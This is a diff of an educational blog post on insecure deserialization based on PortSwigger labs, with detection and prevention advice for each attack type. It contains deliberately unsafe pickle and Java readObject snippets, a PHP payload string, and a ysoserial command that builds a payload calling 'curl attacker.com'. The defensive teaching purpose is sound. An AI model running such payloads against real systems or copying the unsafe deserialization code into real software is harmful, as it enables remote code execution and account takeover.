@@ -7,17 +7,16 @@ tags: [owasp, insecure-deserialization, web-security, portswigger]
 
 <div style="background-color: #f9f9f9; padding: 20px; border-left: 5px solid #007acc; border-radius: 6px; margin-bottom: 20px;">
 
-<strong>Table of Contents</strong>
+<strong> Table of Contents</strong>
 
 <ul>
   <li><a href="#introduction">Introduction</a></li>
-  <li><a href="#what-is-insecure-deserialization">What Is Insecure Deserialization?</a></li>
-  <li><a href="#why-it-matters">Why It Matters</a></li>
+  <li><a href="#why-insecure-deserialization-is-dangerous">Why Insecure Deserialization Is Dangerous</a></li>
   <li><a href="#how-insecure-deserialization-works">How Insecure Deserialization Works</a></li>
-  <li><a href="#common-attack-scenarios">Common Attack Scenarios</a></li>
-  <li><a href="#portswigger-lab-example">PortSwigger Lab Example</a></li>
-  <li><a href="#detection-techniques">Detection Techniques</a></li>
-  <li><a href="#mitigation-and-prevention">Mitigation and Prevention</a></li>
+  <li><a href="#1-remote-code-execution">1. Remote Code Execution</a></li>
+  <li><a href="#2-authentication-bypass">2. Authentication Bypass</a></li>
+  <li><a href="#3-privilege-escalation--dos">3. Privilege Escalation & DoS</a></li>
+  <li><a href="#4-second-order-deserialization">4. Second-Order Deserialization</a></li>
   <li><a href="#summary">Summary</a></li>
   <li><a href="#conclusion">Conclusion</a></li>
   <li><a href="#references">References</a></li>
@@ -27,131 +26,149 @@ tags: [owasp, insecure-deserialization, web-security, portswigger]
 
 ## Introduction
 
-Insecure Deserialization is a critical vulnerability that can lead to Remote Code Execution (RCE), privilege escalation, authentication bypass, and other severe consequences. It appears in the OWASP Top 10 because of its high impact and frequency in complex applications using object serialization mechanisms.
+**Insecure Deserialization** happens when an application deserializes untrusted data without proper validation. Attackers exploit this to manipulate application logic, escalate privileges, or even achieve **Remote Code Execution (RCE)**. This vulnerability is part of the OWASP Top 10 and often leads to complete system compromise.
 
-In this blog, I’ll summarize what I’ve learned from the **PortSwigger Academy** labs related to insecure deserialization, focusing on attack vectors, detection, and practical prevention methods.
-
----
-
-## What Is Insecure Deserialization?
-
-Deserialization is the process of converting serialized data (often a string or byte stream) back into a data structure or object. Insecure deserialization occurs when an application accepts untrusted input to deserialize without validation or sanitization, allowing attackers to inject arbitrary code or manipulate application logic.
-
-### Example:
-
-```python
-import pickle
-
-user_input = request.GET['data']
-obj = pickle.loads(user_input)  # Unsafe
-```
-
-If `user_input` is controlled by the attacker, arbitrary code can be executed.
+All practical examples in this blog are based on **PortSwigger Labs** and my experiments, which are available on [my GitHub repository](https://github.com/haidang17-IA/owasp-top10-labs).
 
 ---
 
-## Why It Matters
+## Why Insecure Deserialization Is Dangerous
 
-- **Remote Code Execution (RCE):** Deserialize payloads can execute system-level commands.
-- **Authentication Bypass:** Attackers can modify user roles or session data.
-- **Denial of Service:** Crafted payloads can crash the application.
-- **Privilege Escalation:** Manipulating serialized objects can lead to elevated access.
+When untrusted serialized data is accepted by an application and deserialized without checks, attackers can:
+
+- Inject **malicious objects** into the app’s memory
+- Execute **arbitrary system commands**
+- **Bypass authentication**, elevate access
+- Cause **denial-of-service (DoS)** or **data corruption**
+
+Unlike SQLi or XSS, this attack targets the app's **internal object structures**, making it harder to detect and prevent.
 
 ---
 
 ## How Insecure Deserialization Works
 
-Attackers exploit the deserialization process by:
+Let’s consider this simplified logic:
 
-1. Crafting a malicious serialized object with executable logic.
-2. Sending it to the application where it is blindly deserialized.
-3. Gaining access or triggering behavior that compromises the system.
+```java
+ObjectInputStream in = new ObjectInputStream(request.getInputStream());
+User user = (User) in.readObject();  // ⚠️ Dangerous!
+```
 
-### Technologies Often Affected:
-
-- Java (with `ObjectInputStream`)
-- PHP (with `unserialize()`)
-- Python (with `pickle`)
-- .NET BinaryFormatter
+If an attacker modifies the serialized `User` object and sends a manipulated one, the application will **blindly execute** whatever logic is embedded in it — even dangerous constructors or overridden methods like `readObject()`.
 
 ---
 
-## Common Attack Scenarios
+## 1. Remote Code Execution
 
-### 1. Remote Code Execution
+### How it works:  
+In certain libraries (e.g., **Apache Commons Collections**, **Spring**), classes can trigger system-level methods during deserialization.
 
-When the object contains executable methods like `__wakeup()`, `__destruct()`, or similar, code can be executed during deserialization.
+Attackers use tools like `ysoserial` to generate a serialized payload that, once deserialized, executes a command (e.g., reverse shell or `curl`).
 
-**Example (PHP):**
-```php
-O:1:"A":1:{s:4:"data";s:20:"malicious_command();";}
+```bash
+java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" > payload.ser
 ```
 
-### 2. Logic Manipulation
+This payload is then sent to a vulnerable endpoint that performs deserialization.
 
-Attacker tampers with serialized session data:
+### Detection:
+- Look for `ObjectInputStream`, `readObject()` or similar in code
+- Analyze suspicious logs or stack traces
+- Monitor network traffic for callbacks to attacker servers
 
-```
-s:10:"user_role";s:5:"admin";
-```
-
-Result: Escalated privileges
-
-### 3. Replay Attacks
-
-Reusing serialized tokens like JWT or session cookies that contain outdated but valid data.
-
----
-
-## PortSwigger Lab Example
-
-In the **PortSwigger Lab: Exploiting Insecure Deserialization**, we interact with a vulnerable shopping cart that stores serialized data in a session cookie. By decoding, modifying, and re-encoding it, we can gain admin access.
-
-### Steps:
-
-1. Decode base64 session cookie
-2. Identify serialized PHP object
-3. Inject payload using tools like `phpggc`
-4. Encode and send modified cookie
-5. Gain elevated privileges or trigger execution
+### Prevention:
+- Never deserialize untrusted input
+- Use allowlists of deserializable classes
+- Use safer formats like JSON with strict schema
+- Validate digital signatures or HMACs for integrity
 
 <div style="text-align: center;">
-  <img src="/top10-owasp-blog/assets/images/insecure-deserialization-lab.png" alt="Insecure Deserialization Lab" style="width: 50%; border: 1px solid #ccc; border-radius: 8px;">
-  <p><em>Figure: Exploiting a vulnerable deserialization process</em></p>
+  <img src="/top10-owasp-blog/assets/images/insecure-deserialization.png" alt="Deserialization Attack Flow" style="width: 50%; border: 1px solid #ccc; border-radius: 8px;">
+  <p><em>Figure: Exploiting deserialization to trigger RCE</em></p>
 </div>
 
 ---
 
-## Detection Techniques
+## 2. Authentication Bypass
 
-- **Analyze application behavior:** Look for base64-encoded cookies or request bodies
-- **Scan for known patterns:** Serialized object formats, e.g., `O:8:"stdClass"`
-- **Use fuzzing tools:** Burp Suite, DeserLab, ysoserial, phpggc
-- **Static Code Analysis:** Review usage of `pickle`, `unserialize()`, `BinaryFormatter`, etc.
+### How it works:  
+Some applications serialize entire **user session** or **authentication state** into cookies or hidden fields. If this data isn’t encrypted or signed, attackers can tamper with it.
+
+#### Example:
+```text
+Cookie: session=base64(serialized_user_object)
+```
+
+Attacker decodes, modifies `role=admin`, re-encodes and gains elevated access.
+
+### Detection:
+- Look for serialized blobs in cookies or URL params
+- Inspect base64-encoded or binary values for structure
+
+### Prevention:
+- Sign session tokens with HMAC
+- Store session state server-side
+- Avoid putting serialized objects in user-controllable places
 
 ---
 
-## Mitigation and Prevention
+## 3. Privilege Escalation & DoS
 
-- **Never deserialize untrusted input** unless strictly validated
-- **Use safe serialization formats** like JSON instead of binary-based ones
-- **Implement integrity checks** (e.g., HMAC signatures)
-- **Restrict classes available for deserialization**
-- **Use language-specific libraries/tools** to safely deserialize
-- **Patch known gadgets** (e.g., avoid insecure libraries)
+### How it works:  
+Manipulated serialized input can change logic flows, impersonate users, or consume resources:
+
+- Inflate object graph size → crash app (billion laughs attack style)
+- Change internal flags like `isAdmin=true`
+- Create fake user tokens
+
+### Detection:
+- Monitor for unusually large or nested serialized inputs
+- Analyze memory usage and CPU spikes on deserialization
+
+### Prevention:
+- Limit size and depth of accepted serialized objects
+- Set deserialization timeout
+- Enforce input format validation
+
+---
+
+## 4. Second-Order Deserialization
+
+### How it works:  
+Attacker injects a **malicious object** into the database or file system. The object sits dormant until the app deserializes it later in a different context.
+
+#### Example:
+- Injected via profile update or comment field
+- Later deserialized when admin views it
+
+This attack is sneaky because the deserialization point and injection point are **not in the same place**.
+
+### Detection:
+- Review all deserialization points
+- Log all data sources leading to object deserialization
+
+### Prevention:
+- Sanitize and validate any data that might later be deserialized
+- Isolate data flows that involve stored serialized objects
+- Perform regular code audits
 
 ---
 
 
 ## Conclusion
 
-Insecure Deserialization is a silent but powerful attack vector. With tools like **phpggc**, **ysoserial**, and labs from **PortSwigger**, it's possible to simulate real-world deserialization exploits and understand the importance of handling serialized data safely. Developers must treat all serialized data as untrusted and apply strict validation, signed tokens, and safe formats to avoid critical exploits.
+Insecure deserialization is a silent yet devastating vulnerability. If left unchecked, it can lead to **RCE, access control failures, and data corruption**. Through practicing with **PortSwigger Labs**, I learned how such attacks are constructed and how easily insecure logic can be exploited.
+
+As a developer or security analyst:
+- Never trust client-controlled data
+- Use structured data formats
+- Audit and test deserialization paths regularly
+
+Explore my lab notes and payloads in [this GitHub repo](https://github.com/haidang17-IA/owasp-top10-labs).
 
 ---
 
 ## References
 
-- [PortSwigger Academy - Insecure Deserialization](https://portswigger.net/web-security/deserialization)
-- [OWASP Insecure Deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization)
-- [phpggc GitHub](https://github.com/ambionics/phpggc)
-- [ysoserial for Java](https://github.com/frohoff/ysoserial)
+- [OWASP Deserialization Guide](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization)
+- [PortSwigger Insecure Deserialization Labs](https://portswigger.net/web-security/deserialization)
